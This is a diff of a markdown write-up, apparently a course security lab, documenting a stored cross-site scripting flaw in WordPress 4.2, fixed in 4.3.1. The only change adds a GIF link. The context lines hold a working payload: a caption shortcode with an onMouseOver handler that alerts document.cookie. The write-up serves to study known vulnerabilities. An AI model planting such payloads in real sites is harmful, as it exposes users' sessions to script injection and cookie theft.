@@ -11,7 +11,7 @@ Time spent: **5** hours spent in total
     - Vulnerability types: Cross-Site Scripting
     - Tested in version: 4.2
     - Fixed in version: 4.3.1
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![](xss1.gif)
   - [ ] Steps to recreate: 
     - Create a new post with the following payload in the body
     - ```xss1[caption width="100" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(document.cookie)'">Click me</a>```
